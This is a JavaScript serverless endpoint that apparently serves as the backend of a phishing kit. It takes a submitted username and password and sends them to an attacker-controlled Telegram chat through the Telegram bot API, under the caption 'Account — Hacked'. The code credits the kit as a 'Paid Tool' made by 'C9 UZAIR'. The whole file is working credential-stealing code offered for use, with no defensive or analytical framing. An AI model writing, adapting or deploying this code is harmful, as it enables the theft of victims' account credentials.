
export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({
      success: false,
      error: "Method not allowed"
    });
  }

  try {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      return res.status(500).json({
        success: false,
        error: "Telegram configuration is missing"
      });
    }

    const { username, password } = req.body || {};

    if (
      typeof username !== "string" ||
      username.trim().length < 2 ||
      username.trim().length > 100
    ) {
      return res.status(400).json({
        success: false,
        error: "Invalid username"
      });
    }

    if (
      typeof password !== "string" ||
      password.trim().length < 2 ||
      password.trim().length > 1000
    ) {
      return res.status(400).json({
        success: false,
        error: "Invalid password"
      });
    }

    // APP_URL example: https://your-project.vercel.app
    // The logo.png file must be in the repository root.
    const appUrl = (
      process.env.APP_URL ||
      `https://${req.headers.host}`
    ).replace(/\/+$/, "");

    const photoUrl = `${appUrl}/logo.png`;

    function escapeHTML(value) {
      return value.replace(/[&<>"']/g, char => ({
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#39;"
      })[char]);
    }

    const caption =
      `<b>Account — Hacked</b>\n\n` +
      `👤 <b>Username:</b> ${escapeHTML(username.trim())}\n\n` +
      `💬 <b>Password:</b>\n${escapeHTML(password.trim())}\n\n` +
      `💻<b>Paid Tool :</b> MADE BY C9 UZAIR`;

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${token}/sendPhoto`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          photo: photoUrl,
          caption,
          parse_mode: "HTML"
        })
      }
    );

    const result = await telegramResponse.json();

    if (!telegramResponse.ok || !result.ok) {
      console.error("Telegram sendPhoto failed:", result);

      return res.status(502).json({
        success: false,
        error: "Telegram could not send the notification. Check logo URL and bot settings."
      });
    }

    return res.status(200).json({
      success: true
    });

  } catch (error) {
    console.error("Notification error:", error);

    return res.status(500).json({
      success: false,
      error: "Server error. Please try again."
    });
  }
}
